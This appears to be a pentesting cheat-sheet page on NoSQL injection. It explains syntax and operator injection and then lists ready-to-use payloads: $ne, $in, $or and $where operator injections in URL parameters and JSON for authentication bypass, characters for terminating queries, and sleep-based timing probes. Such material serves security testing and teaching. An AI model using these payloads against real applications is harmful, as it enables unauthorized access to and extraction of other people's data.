# ðŸ’‰ NoSQL Injection

## NoSQL Injection

NoSQL injection is a vulnerability where an attacker is able to interfere with the queries that an application makes to a NoSQL database. NoSQL injection may enable an attacker to:

* Bypass authentication or protection mechanisms.
* Extract or edit data.
* Cause a denial of service.
* Execute code on the server.

NoSQL databases store and retrieve data in a format other than traditional SQL relational tables. They use a wide range of query languages instead of a universal standard like SQL, and have fewer relational constraints.



**There are two different types of NoSQL injection:**

* Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in [SQL injection](https://portswigger.net/web-security/sql-injection). However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.
* Operator injection - This occurs when you can use NoSQL query operators to manipulate queries.



### Where & How to Inject Payloads <a href="#where-how-to-inject-payloads" id="where-how-to-inject-payloads"></a>

```
1. site.com/page?query=term || '1'=='1
2. site.com/page?user[$ne]=nobody
```

```
'"\/$[].>
```

### Blind Boolean Injection <a href="#blind-boolean-injection" id="blind-boolean-injection"></a>

```
{"$ne": -1}
{"$in": []}
{"$and": [ {"id": 5}, {"id": 6} ]}
{"$where":  "return true"}
{"$or": [{},{"foo":"1"}]}
site.com/page?query=term || '1'=='1
site.com/page?user[$ne]=nobody
site.com/page?user=;return true
```

You may need to try appending certain characters to correctly terminate the query:

```
//
%00
'
"
some number of closing brackets or braces, in some combination
```



### Timing Based Injection <a href="#timing-based-injection" id="timing-based-injection"></a>

```
{"$where":  "sleep(100)"}
;sleep(100);
```
